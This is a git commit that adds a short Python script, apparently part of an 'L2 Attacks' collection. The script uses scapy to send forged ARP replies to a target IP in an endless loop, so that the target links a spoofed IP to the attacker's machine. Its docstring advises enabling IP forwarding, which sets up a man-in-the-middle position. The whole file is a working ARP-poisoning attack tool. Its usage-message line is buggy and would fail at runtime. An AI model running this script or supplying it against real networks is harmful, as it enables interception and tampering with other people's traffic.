b90a156f9e84c6ec0010e9d4ede0d847599fe11d
tjbronx92 <39333780+tjbronx92@users.noreply.github.com>
2023-05-21 18:45:26 -0700

    L2 Attacks
    L2 Attacks Generator

---
+++ L2/construct_packet.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python3
+
+"""Enable IP Forwarding to prevent host from blocking connection to remorte host. 
+ex: sysctl net.ipv4.ip_forward = 1"""
+
+import sys
+import time
+from scapy.all import sendp, ARP, Ether
+
+if len(sys.argv) < 4:
+	print(sys.argv[0] | "REQUIRED: <target_ip> <spoof_ip> <attack_iface>")
+	sys.exit(1)
+
+iface = sys.argv[3]
+target_ip = sys.argv[1]
+fake_ip = sys.argv[2]
+
+ethernet = Ether()
+
+arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
+
+packet = ethernet / arp
+
+while True:
+	sendp(packet, iface=iface)
+	time.sleep(1)
